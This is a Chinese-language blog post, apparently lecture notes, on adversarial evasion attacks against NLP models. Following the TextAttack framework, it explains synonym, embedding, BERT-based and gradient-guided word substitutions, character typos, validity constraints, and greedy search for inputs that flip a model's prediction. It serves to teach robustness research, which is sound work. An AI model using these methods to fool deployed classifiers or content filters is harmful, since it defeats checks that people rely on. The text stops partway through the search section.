<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>NLP领域模型对抗攻击简介 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="NLP领域模型对抗攻击简介" />
<meta property="og:description" content="一、 Introduction NLP对抗攻击是人工智能对抗攻击的一个重要的组成部分，但是最近几年才逐渐开始兴起，究其原因在于NLP对抗攻击与传统computer vision或者audio对抗攻击有很大的不同，主要在于值空间的连续性（CV、audio）和离散性（NLP）。
如图为传统的一种对CV和audio模型的攻击方式：
如图，对CV与audio的攻击是在一张图片或一段录音中加入微小连续的扰动（如高斯噪声），在人眼或人耳不可识别的条件下使模型进行错误的分类。
以对CV模型攻击为例：
CV的 256 × 256 256 \times 256 256×256大小的图片像素值空间为 [ 0 , 255 ] 256 × 256 [0,255]^{256 \times 256} [0,255]256×256内的连续实数空间，对其添加扰动比较容易。
但是，如图
NLP领域中，数值是由一个一个的离散的token组成。因此对NLP模型进行处理时，需要先将离散的token转换为连续的vector，这样才能让NLP模型对其进行处理。因此，对NLP模型做攻击时，也只能处理离散的token。（连续的vector一般来说是在NLP模型内部生成的，因为无法做到对其加噪声）。
二、Evasion Attacks and Defenses 1. Introduction 在CV中，Evasion Attacks就是在图片中添加人眼不可见的噪声，使图片分类模型对其进行错误的分类。
如图：
对于原始图片，模型有57.7%的概率认为其是熊猫，但是在对其添加了人眼无法察觉到的噪声（连续值空间）后，模型有99.3%的概率认为其是长臂猿（分类错误）。
同样的，在NLP中，Evasion Attack指的是：对原始的句子进行修改，在对人类来说不改变语义的情况下使模型对修改过的句子进行错误的预测。
以情感分析为例，如图：
上图是一段影评，对于原始的句子，NLP模型认为其是负面的，但是在对film添加上一个s后，模型认为其是正面，这对人来说，是很难察觉的。
对NLP的Evasion Attack还有其他方面，比如修改句子，使翻译模型对其进行错误的翻译。这里不在进行赘述。
2. Four Ingredients in Evasion Attacks 以影评的情感分析为例，Evasion Attacks攻击的完整步骤（执行框架）为：
1 Goal，对既定的攻击模型和对抗样本指定攻击目标。
2 Transformation，对对抗样本进行相应的转换（添加扰动），在此过程中会产生很多可能的候选样本。
3 Constraints，根据设置的限制条件，对候选样本进行过滤。（比如，语法错误、人称错误或同义词变成反义词等等）
4 Search: 采取一些研究方法，在候选的样本中选择可以成功的使模型进行错误预测的样本作为最终的对抗样本。
Morris, J., Lifland, E., Yoo, J. Y., Grigsby, J." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/bb8397ad78b4f7fc24f3e9dc85a04bd4/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-28T10:43:58+08:00" />
<meta property="article:modified_time" content="2023-08-28T10:43:58+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">NLP领域模型对抗攻击简介</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="_Introduction_0"></a>一、 Introduction</h2> 
<p>NLP对抗攻击是人工智能对抗攻击的一个重要的组成部分，但是最近几年才逐渐开始兴起，究其原因在于NLP对抗攻击与传统computer vision或者audio对抗攻击有很大的不同，主要在于值空间的连续性（CV、audio）和离散性（NLP）。</p> 
<p>如图为传统的一种对CV和audio模型的攻击方式：<br> <img src="https://images2.imgbox.com/86/af/4zCg0HX7_o.png" alt="在这里插入图片描述" width="700"><br> 如图，对CV与audio的攻击是在一张图片或一段录音中加入微小<strong>连续</strong>的扰动（如高斯噪声），在人眼或人耳不可识别的条件下使模型进行错误的分类。</p> 
<p>以对CV模型攻击为例：</p> 
<p><img src="https://images2.imgbox.com/71/d4/qdk68uhU_o.png" alt="在这里插入图片描述" width="300"></p> 
<p>CV的<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         256 
        
       
         × 
        
       
         256 
        
       
      
        256 \times 256 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.7278em; vertical-align: -0.0833em;"></span><span class="mord">256</span><span class="mspace" style="margin-right: 0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right: 0.2222em;"></span></span><span class="base"><span class="strut" style="height: 0.6444em;"></span><span class="mord">256</span></span></span></span></span>大小的图片像素值空间为<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         [ 
        
       
         0 
        
       
         , 
        
       
         255 
        
        
        
          ] 
         
         
         
           256 
          
         
           × 
          
         
           256 
          
         
        
       
      
        [0,255]^{256 \times 256} 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.0641em; vertical-align: -0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">255</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.8141em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">256</span><span class="mbin mtight">×</span><span class="mord mtight">256</span></span></span></span></span></span></span></span></span></span></span></span></span>内的连续实数空间，对其添加扰动比较容易。</p> 
<p>但是，如图</p> 
<p><img src="https://images2.imgbox.com/3c/45/2xoHaqUi_o.png" alt="在这里插入图片描述" width="300"></p> 
<p>NLP领域中，数值是由一个一个的<strong>离散</strong>的token组成。因此对NLP模型进行处理时，需要先将离散的token转换为连续的vector，这样才能让NLP模型对其进行处理。因此，对NLP模型做攻击时，也只能处理离散的token。（连续的vector一般来说是在NLP模型内部生成的，因为无法做到对其加噪声）。</p> 
<h2><a id="Evasion_Attacks_and_Defenses_22"></a>二、Evasion Attacks and Defenses</h2> 
<h3><a id="1_Introduction_24"></a>1. Introduction</h3> 
<p>在CV中，Evasion Attacks就是在图片中添加人眼不可见的噪声，使图片分类模型对其进行错误的分类。</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/f0/c4/dcvrbnuF_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>对于原始图片，模型有57.7%的概率认为其是熊猫，但是在对其添加了<strong>人眼无法察觉</strong>到的噪声（连续值空间）后，模型有99.3%的概率认为其是长臂猿（分类错误）。</p> 
<p>同样的，在NLP中，Evasion Attack指的是：对原始的句子进行修改，在<strong>对人类来说</strong>不改变语义的情况下使模型对修改过的句子进行错误的预测。</p> 
<p>以情感分析为例，如图：</p> 
<p><img src="https://images2.imgbox.com/16/71/nDPuSZxp_o.png" alt="在这里插入图片描述" width="400"></p> 
<p>上图是一段影评，对于原始的句子，NLP模型认为其是负面的，但是在对film添加上一个s后，模型认为其是正面，这对人来说，是很难察觉的。</p> 
<p>对NLP的Evasion Attack还有其他方面，比如修改句子，使翻译模型对其进行错误的翻译。这里不在进行赘述。</p> 
<h3><a id="2_Four_Ingredients_in_Evasion_Attacks_46"></a>2. Four Ingredients in Evasion Attacks</h3> 
<p>以影评的情感分析为例，Evasion Attacks攻击的完整步骤（执行框架）为：</p> 
<p><img src="https://images2.imgbox.com/17/5a/FweiedfS_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>1 Goal，对既定的攻击模型和对抗样本指定攻击目标。</p> 
<p>2 Transformation，对对抗样本进行相应的转换（添加扰动），在此过程中会产生很多可能的候选样本。</p> 
<p>3 Constraints，根据设置的限制条件，对候选样本进行过滤。（比如，语法错误、人称错误或同义词变成反义词等等）</p> 
<p>4 Search: 采取一些研究方法，在候选的样本中选择可以成功的使模型进行错误预测的样本作为最终的对抗样本。</p> 
<blockquote> 
 <p>Morris, J., Lifland, E., Yoo, J. Y., Grigsby, J., Jin, D., &amp; Qi, Y. (2020). TextAttack: A framework for adversarial attacks, data augmentation, and adversarial training in NLP. <em>Proceedings of the 2020 Conference on Empirical Methods in Natural Language Processing: System Demonstrations</em>.2020.</p> 
</blockquote> 
<h4><a id="21_Goal_What_the_attack_aims_to_achieve_63"></a>2.1. Goal: What the attack aims to achieve</h4> 
<p>以新闻类别分类为例：</p> 
<h5><a id="211_Untargeted_classification__67"></a>2.1.1. Untargeted classification: 使模型对当前文本做错误的分类而不关心错误分类的类别。</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/62/c9/9hCAJiep_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>对原有新闻文本进行修改，使NLP模型对其进行错误的分类，但是不关心误分类的类别。（只要错误分类就行，其他的不关心）</p> 
<h5><a id="212_Targeted_classification__76"></a>2.1.2. Targeted classification: 使模型对当前文本做误分类，且误分类的类别也应该被指定。</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/46/5d/FyyPvirM_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>在对原有新闻文本进行修改后，使模型误分类到指定的Sci/Tech板块。</p> 
<h5><a id="213_Universal_suffix_dropper__85"></a>2.1.3. Universal suffix dropper: 在对翻译文本加入一些前缀后，模型回忽略前缀后的文本。</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/e5/4a/u8R4F7eH_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>如图，在对翻译文本添加红色前缀后，其后面的紫色文本将不在会被翻译。</p> 
<blockquote> 
 <p>Wallace, E., Stern, M., &amp; Song, D. (2020). Imitation attacks and defenses for black-box machine translation systems. <em>Proceedings of the 2020 Conference on Empirical Methods in Natural Language Processing (EMNLP)</em>.2020</p> 
</blockquote> 
<h5><a id="214_Wrong_parse_tree_in_dependency_parsing_96"></a>2.1.4. Wrong parse tree in dependency parsing：使模型对当前文本做错误的解析</h5> 
<p><img src="https://images2.imgbox.com/3f/49/3joISAVK_o.png" alt="在这里插入图片描述" width="500"></p> 
<blockquote> 
 <p>Zheng, X., Zeng, J., Zhou, Y., Hsieh, C.-J., Cheng, M., &amp; Huang, X. (2020). Evaluating and enhancing the robustness of neural network-based dependency parsing models with adversarial examples. <em>Proceedings of the 58th Annual Meeting of the Association for Computational Linguistics</em>.2020</p> 
</blockquote> 
<h4><a id="22_Transformations_How_to_construct_perturbations_for_possible_adversaries_103"></a>2.2. Transformations: How to construct perturbations for possible adversaries</h4> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/48/55/0Bvfieu3_o.png" alt="在这里插入图片描述" width="400"></p> 
<p>如图，采取某些方法对样本进行转换，产生大量候选样本。之后再运用constrain对候选样本进行过滤。</p> 
<h5><a id="221_word_substitution_by_WordNet_synonyms_112"></a>2.2.1. word substitution by WordNet synonyms</h5> 
<p>同义词替换，在进行文本转换时必须要保持文本的语义不变，因此最简单的方法是进行同义词替换。WorkNet synonyms是一个同义词数据集。</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/a6/66/uLSZyctF_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>如图，对原始文本根据WorkNet synonyms进行同义词替换。但是，在替换时可能会出现替换后的句子语音改变或者“别扭”，这时就需要constraint进行过滤。</p> 
<h5><a id="222_Word_substitution_by_knn_or_varepsilonball_in_counterfitted_Glove_embedding_space_123"></a>2.2.2. Word substitution by knn or <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         ε 
        
       
      
        \varepsilon 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.4306em;"></span><span class="mord mathnormal">ε</span></span></span></span></span>-ball in counter-fitted Glove embedding space</h5> 
<p>将文本的单词转换为对应的word embedding，在embedding vector中寻找相近的单词。</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/75/bc/fFeAfn7j_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>对原始文本进行转换，不是进行同义词替换，而是在Counter-fitted embedding space中设置一个半径为<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         ε 
        
       
      
        \varepsilon 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.4306em;"></span><span class="mord mathnormal">ε</span></span></span></span></span>的“球”（可以认为“球”内的embedding对应的单词与原始单词最接近，<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         ε 
        
       
      
        \varepsilon 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.4306em;"></span><span class="mord mathnormal">ε</span></span></span></span></span>是单词接近的程度）。这样就可以防止一些不合语义的候选样例产生。</p> 
<p>Counter-fitted embedding space: Use linguistic constrains to pull synonyms closer and antonyms far away from each others</p> 
<p>如图，</p> 
<p><img src="https://images2.imgbox.com/52/bc/w1oBJ9uU_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>Counter-fitted使用语言学的一些限制，让同义词变得更近，反义词变的更远。</p> 
<p>对于原始的Glove embedding space词性相近，出现频率相同的单词是靠的比较近的。比如：东、西、南、北，但是如果将”东“变成”西“，那么句子的整个意思就会发生改变，因此需要在Counter-fitted Glove embedding space中画一个半径为<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         ε 
        
       
      
        \varepsilon 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.4306em;"></span><span class="mord mathnormal">ε</span></span></span></span></span>的球，这样句子的意思才不容易改变。</p> 
<blockquote> 
 <p>Mrkšić, N., Ó Séaghdha, D., Thomson, B., Gašić, M., Rojas-Barahona, L. M., Su, P.-H., Vandyke, D., Wen, T.-H., &amp; Young, S. (2016). Counter-fitting word vectors to linguistic constraints. <em>Proceedings of the 2016 Conference of the North American Chapter of the Association for Computational Linguistics: Human Language Technologies</em>.2016</p> 
</blockquote> 
<h5><a id="223_Word_substitution_by_BERT__masked_language_modelingMLM_prediction_146"></a>2.2.3. Word substitution by BERT masked language modeling(MLM) prediction</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/38/20/HuKt0lFb_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>首先，对文本的相关单词进行遮蔽，之后放入BERT中输出预测的单词将其插回源文本作为候选文本。但是，可以看到，BERT预测的masked token与源文本的token差别比较大，且预测概率最高的单词"double"与源文本"recommend"甚至相反，因此，单独使用BERT对masked token做预测是不可取的行为。</p> 
<h5><a id="224_Word_substitution_by_BERT_reconstructionno_masking_155"></a>2.2.4. Word substitution by BERT reconstruction(no masking)</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/c6/c9/T87f4n0A_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>如图，不对源文本进行遮蔽，直接将其放入BERT中，这样输出的字符信息就与源文本中对应的字符十分接近。但是，可以看到不进行遮蔽时，预测的字符与源文本中的字符十分接近，因此大大限制了BERT的能力。</p> 
<h5><a id="225_Word_substitution_by_changing_the_inflectional_form_of_verbs_nouns_and_adjectives_164"></a>2.2.5. Word substitution by changing the inflectional form of verbs, nouns and adjectives</h5> 
<p>Inflectional morpheme: an affix that never changes the basic meaning of a word, and are indicative/characteristic of the part of speech(POS).</p> 
<p>屈折语素：永远不会改变单词基本含义的词缀，并且指示/表征词性（POS）</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/9f/03/M5Hfovoi_o.png" alt="在这里插入图片描述" width="400"></p> 
<p>如图，在不改变单词含义的情况下，改变了单词的时态。但是可以看到，改变时，第一和第三个句子语法是错误的，因此还需要在constraint中进行过滤。</p> 
<h5><a id="226_Word_substitution_by_gradient_of_the_word_embedding_177"></a>2.2.6. Word substitution by gradient of the word embedding</h5> 
<p>该方法涉及梯度计算，因此这是一个white-box攻击。</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/02/f6/BEYmEuIl_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>首先，将源文本放入模型中，会得到对应的Loss，之后对文本中指定的单词<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          0 
         
        
       
      
        e_0 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>（如recommend）求偏导，这便是<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          0 
         
        
       
      
        e_0 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>在当前文本中的贡献。</p> 
<p>之后：</p> 
<p><img src="https://images2.imgbox.com/ac/49/Dg6mmmV5_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>计算，计算<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          0 
         
        
       
      
        e_0 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>与嵌入空间其他的embedding的差与Loss和<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          0 
         
        
       
      
        e_0 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>偏导的乘积，这便是当<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          0 
         
        
       
      
        e_0 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>变为其他字符时，Loss改变的一阶近似。</p> 
<p>在运行中，选择使当前Loss改变最大的单词作为转换的单词。（Loss越大代表模型预测越“不准”）</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/41/21/XJ6Q3IKY_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>该图为，二维状态下的数学解释，比较简单就不赘述了。</p> 
<h5><a id="227_Word_insertion_based_on_BERT_MLM_204"></a>2.2.7. Word insertion based on BERT MLM</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/94/7a/6qOXTnuL_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>如图，在想插入单词的位置先插入一个masked token，之后将插入后的文本放入BERT中，获得BERT预测的插入后的文本作为对抗的候选文本。</p> 
<h5><a id="228_Word_deletion_213"></a>2.2.8. Word deletion</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/22/87/gHmzLM1z_o.png" alt="在这里插入图片描述" width="400"></p> 
<p>如图，直接删减单词，不建议单独使用。</p> 
<h5><a id="229_Character_level_transform_222"></a>2.2.9. Character level transform</h5> 
<ul><li>Swap</li><li>Substitution</li><li>Deletion</li><li>Insertion</li></ul> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/cf/cd/O53ih7Gk_o.png" alt="在这里插入图片描述" width="700"></p> 
<p>字符级别的转换在日常中十分常见，比如一个人在打字时多打一个字母或少打一个字母。特别的，在Substitution方法中，会专门寻找与当前字母在键盘上相近的字母进行替换，这样可以提高真实性。</p> 
<p>因为在模型训练时，模型可能没有接触过类似的字符出错的“错别字”，因此该方法生成的对抗样本的性能比较高。</p> 
<blockquote> 
 <p>Gao, J., Lanchantin, J., Soffa, M. L., &amp; Qi, Y. (2018). Black-box generation of adversarial text sequences to evade deep learning classifiers. <em>2018 IEEE Security and Privacy Workshops (SPW)</em>.2018</p> 
</blockquote> 
<h4><a id="23_Constrains_What_a_valid_adversarial_examples_should_satisfy_240"></a>2.3. Constrains: What a valid adversarial examples should satisfy</h4> 
<h5><a id="231_What_a_valid_adversarial_sample_should_satify_242"></a>2.3.1. What a valid adversarial sample should satify</h5> 
<p>关于对抗样本的限制要具体问题具体分析。</p> 
<p>目前来说，一般的限制条件包括overlapping、grammaticality和semantic similarity</p> 
<h5><a id="232_Overlapping_between_the_original_and_perturbed_sample_248"></a>2.3.2. Overlapping between the original and perturbed sample</h5> 
<h6><a id="2321_Levenshtien_edit_distance_character_level_250"></a>2.3.2.1. Levenshtien edit distance (character level)</h6> 
<p>该方法一般用在character level的对抗样本中。</p> 
<p>该方法计算，transform后的单词与transform之前的单词按顺序改动的字符的数量。（越小越好）</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/cb/c4/APq5ho9c_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>Levenshtien edit distance问题是实质上一个递归问题，其本质上是比较两个单词之间的不同字符的数量。</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/76/5e/FYiVCzzG_o.png" alt="在这里插入图片描述" width="300"></p> 
<p>假设kitten经过transform之后变为sitting。</p> 
<p>step1: k -&gt; s,，lev + 1</p> 
<p>Step2: i、t、t没变，此时lev不变</p> 
<p>step3: e -&gt; i，lev + 1</p> 
<p>step4: n没变，此时lev不变</p> 
<p>step5: kitten此时已经全部比较完毕，根据公式，如果kitten比较完毕，level + sitting剩下的长度，即 lev + 1</p> 
<p>此时，lev计算完毕</p> 
<h6><a id="2322_Maximum_percentage_of_modified_words_282"></a>2.3.2.2. Maximum percentage of modified words</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/e1/4d/weo5mV9p_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>该方法计算，transform之后的文本中，被修改的单词的比例。（越小越好）</p> 
<h5><a id="233_Grammaticality_of_the_perturbed_sample_291"></a>2.3.3. Grammaticality of the perturbed sample</h5> 
<h6><a id="2331_Part_of_speech_POS_consistency_293"></a>2.3.3.1. Part of speech (POS) consistency</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/e1/c2/KS0s6oiq_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>POS，即词性，通过限制transform之后单词的词性来保证transform之后文本在语法和语义上的正确性。如上图，recommend是非单三的动词形式，第一个候选样本是advocate，完全符合；第三个候选样本是recommendation，是名词，不符合；第二个候选样本是recommended，是动词过去时，虽然在语法上仍然正缺但是修改了原词的时态，其保留与否还需具体问题具体分析。</p> 
<h6><a id="2332_Number_of_grammarical_errors_evaluated_by_some_toolkit_302"></a>2.3.3.2. Number of grammarical errors (evaluated by some toolkit)</h6> 
<p>借助语法检查工具来检查当前候选文本中语法错误的数量。（越少越好）</p> 
<h6><a id="2333_Fluency_scored_by_the_perplexity_of_a_pretrained_language_model_306"></a>2.3.3.3. Fluency scored by the perplexity of a pre-trained language model</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/77/32/CHYlzJBD_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>将当前生成的候选文本送人预训练语言模型，根据其perplexity（困惑度），来过滤候选样本。（perplexity越小越好）</p> 
<h5><a id="234_Semantic_similarity_between_the_transformed_sample_and_the_original_sample_315"></a>2.3.4. Semantic similarity between the transformed sample and the original sample</h5> 
<h6><a id="2341_Diatance_of_the_swapped_words_embedding_and_the_original_words_embeding_317"></a>2.3.4.1. Diatance of the swapped word’s embedding and the original word’s embeding</h6> 
<p>在embedding space中比较两个单词之间的相似性，通过设置一个合理的阈值来对候选样本吗进行过滤。</p> 
<p>如图，以余弦相似度为例判断单词之间相似程度：</p> 
<p><img src="https://images2.imgbox.com/bd/0c/yqdxn6jF_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>该例通过embedding space中不同单词之间的余弦相似度来判断单词之间的相似程度。需要注意的时，阈值的设定十分重要，不好的阈值会使攻击效果十分差。</p> 
<h6><a id="2342_Similarity_between_the_transformed_samples_sentence_embedding_and_the_original_samples_sentence_embedding_328"></a>2.3.4.2. Similarity between the transformed sample’s sentence embedding and the original sample’s sentence embedding</h6> 
<p>如图，以余弦相似度为例：</p> 
<p><img src="https://images2.imgbox.com/0e/4c/Q8KuCG5L_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>首先选择一个通用的句子编码器（可以输入字符串的NLP模型），获取文本的embeding vector，之后比较两个句子之间的余弦相似度，根据设置的余弦相似度阈值来过滤候选像本。</p> 
<h4><a id="24_Search_Method_How_to_find_an_adversarial_example_from_the_transformations_that_satisfies_the_constrains_and_meets_the_goal_337"></a>2.4. Search Method: How to find an adversarial example from the transformations that satisfies the constrains and meets the goal</h4> 
<h5><a id="241_Greedy_Search_Score_the_each_transformation_at_each_position_and_then_replace_the_words_in_decreasing_order_of_the_score_until_the_prediction_flips_339"></a>2.4.1. Greedy Search: Score the each transformation at each position, and then replace the words in decreasing order of the score until the prediction flips</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/38/39/zvDru4iE_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>step1: 产生修改各个单词之后的候选样本，并送入被攻击模型中，得到模型的分类概率与Loss</p> 
<p>step2: 根据Loss从大到小对候选样本进行降序排序，并按需修改替换单词，直到模型进行错误的分类。</p> 
<p>step3: 对抗样本生成成功。</p> 
<p>以上图为例：首先将highly换为inordinately，此时虽然Loss大幅上升，但是模型的分类仍然正确。这时挑选Loss第二大的样本，将recommend修改为advocate，这时模型进行了错误的分类（将positive误分类成了negative）。对抗样本生成成功。</p> 
<p>注意，有greedy search就有beam search，这里不再赘述。</p> 
<h5><a id="242_Greedy_search_with_word_imprtance_ranking_WIR_356"></a>2.4.2. Greedy search with word imprtance ranking (WIR)</h5> 
<h6><a id="Word_Importance_ranking_by_leaveoneoutLOO_see_how_the_ground_truth_probablity_decreases_when_the_word_is_removed_from_the_input_358"></a>Word Importance ranking by leave-one-out(LOO): see how the ground truth probablity decreases when the word is removed from the input</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/ed/01/VdxKu0R2_o.png" alt="" width="600"></p> 
<p>逐个删除单词，计算删除后文本的Loss和预测概率分布的差值。Loss上升越大和正确分类概率下降值越大，则代表当前单词越重要。</p> 
<h6><a id="Word_Impartance_ranking_by_the_gradient_of_the_word_embedding_whitebox_367"></a>Word Impartance ranking by the gradient of the word embedding (white-box)</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/04/8c/yWvGficU_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>通过计算Loss与各个单词的embedding vector做偏导，来计算单词的重要程度。偏导值越大的代表单词的重要性越高。</p> 
<h6><a id="Step_1_Score_each_words_importance_376"></a>Step 1: Score each word’s importance</h6> 
<p><img src="https://images2.imgbox.com/f6/cd/Qo7lPKmB_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>首先对文本中各个单词的重要性排序。</p> 
<h6><a id="Step2_Swap_the_words_from_the_most_important_to_the_leasrt_important_383"></a>Step2: Swap the words from the most important to the leasrt important</h6> 
<p><img src="https://images2.imgbox.com/66/90/15qIkXyp_o.png" alt="在这里插入图片描述" width="600"></p> 
